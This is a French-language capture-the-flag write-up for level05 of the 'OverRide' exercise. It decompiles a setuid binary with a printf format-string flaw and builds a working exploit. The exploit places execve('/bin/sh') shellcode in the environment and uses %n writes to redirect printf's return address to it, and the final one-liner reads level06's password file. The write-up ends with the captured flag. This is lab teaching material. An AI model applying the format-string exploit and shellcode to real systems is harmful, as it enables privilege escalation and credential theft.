# OverRide : [level05]

### Observation :
En arrivant sur le level02 on trouve un exécutable nommé level05.\
Quand nous essayons de le lancer cela nous permet d'écrire une chaîne de caractères qui nous sera renvoyé. \
Regardons donc avec gdb ou un decompilateur.

---

#### Source décompilée:
```c
int main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+28h] [ebp-70h] BYREF
  unsigned int i; // [esp+8Ch] [ebp-Ch]

  i = 0;
  fgets(s, 100, stdin);
  for ( i = 0; i < strlen(s); ++i )
  {
    if ( s[i] > 64 && s[i] <= 90 )
      s[i] ^= 0x20u;
  }
  printf(s);
  exit(0);
}
```

#### Détails du profil:
```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE 
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

#### Détails du programme:
```bash
-rwsr-s---+ 1 level06 users   5176 Sep 10  2016 level05
```

#### Fonctions:

| Nom | Description |
| --- | ----------- |
| `<main>` | La fonction main permet d'afficher une string entrée en stdin dans un `printf` en faisant un `xor` sur le 6eme bit (32) de tous les caractères qui se trouve entre `65 et 90`, en gros cela transforme les majuscules en minuscules. |


#### Conclusions:
Nous savons que nous pouvons injecter du code avec `printf` a la condition de ne pas avoir de majuscule dans notre stdin. \
Nous allons devoir injecter un shellcode car il n'y a pas de fonction dans le programme qui nous permet d'y accéder directement.


----
Résolution:
----
Pour résoudre cet exercice, il ne faut pas placer notre `shellcode` dans notre stdin, car il contient des caracteres entre `65 && 90`, il seront donc transformer... \
Nous allons le placer dans notre environnement, car nous savons que le programme y a accès, le problème avec cette solution, est que la stack se déplace en fonction du nombre de choses dans notre environnement. \
Pour se faire nous allons donc complètement vider la stack, non pas avec `env -i` car cela ne la vide pas complètement et donc se serai très compliqué à debuger dans gdb, mais avec une autre commande `$(unset $(env | cut -d= -f1); <cmd>)`. \
Ensuite, il nous faut trouver l'adresse à laquelle nous souhaitons aller (adresse de notre shellcode dans l'env), ainsi que l'adresse depuis laquelle nous voulons `jump` (retour de `printf` par exemple ou depuis la fonction exit).

> ATTENTION Toujours faire les tests juste avec notre shellcode comme environnement rien d'autre

Dès que nous avons trouvé l'adresse de notre `jump` (le retour de `printf` dans notre cas) = `0xffffdd5c` \
Il nous faut trouver l'adresse de notre `shellcode` dans l'environemennt, pour ça, on a un code `main.c`, puis on le test sans environnement
```sh
echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80') ;  ./a.out))
```
> Cela nous donne une idée d'où est placer l'environnement, ça ne sera pas forcément exactement ici dans notre cas, car il y a beaucoup de paramètre à prendre en compte...

Apres avoir fait les calculs d'offset, sans environnement nous obtenons: `0xffffdfa5` comme adresse de notre `shellcode`. \
Il ne nous suffit plus qu'à injecter grâce au `%n` de `printf` le bon nombre de caractères à l'adresse de retour de notre `printf` pour pouvoir la remplacer par l'adresse de notre `shellcode` pour qu'il soit ainsi exécuté.
- 0xa5 = 165 en decimal           donc 165 caracteres avant le %n
- 0xdf = 223 donc 223 - 165 = 58  donc 58 caracteres avant le %n
- 0xff = 255 donc 255 - 223 = 32  donc 32 caracteres avant le %n
- 0xff = 255 donc 255 - 255 = 0   donc 0 caracteres avant le %n

> Nous avons ainsi notre valeur de retour de `printf` qui pointe vers notre `shellcode`, nous n'avons plus qu'à lui demander le mot de passe de l'utilisateur level06.

#### Injection:
```asm
# SHELLCODE
# La fonction injectée appelle <system> avec '/bin/sh' en paramètre:

0:  6a 0b                   	push   0xb
2:  58                      	pop    eax
3:  31 f6                   	xor    esi,esi
5:  56                      	push   esi
6:  68 2f 2f 73 68          	push   0x68732f2f
b:  68 2f 62 69 6e          	push   0x6e69622f
10: 89 e3                   	mov    ebx,esp
12: 31 c9                   	xor    ecx,ecx
14: 89 ca                   	mov    edx,ecx
16: cd 80                   	int    0x80
```


#### Commande:
```bash
echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80'); (/usr/bin/python -c "print('\xff\xff\xdd\x5c'[::-1] + 'A'*4 + '\xff\xff\xdd\x5d'[::-1] + 'A'*4 + '\xff\xff\xdd\x5e'[::-1] + '\xff\xff\xdd\x5f'[::-1] + '%9.x'*8+'%69.c' + '%n' + '%58.c' + '%n' + '%32.c' + '%n' + '%n')"; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05))
```

**Flag :** h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
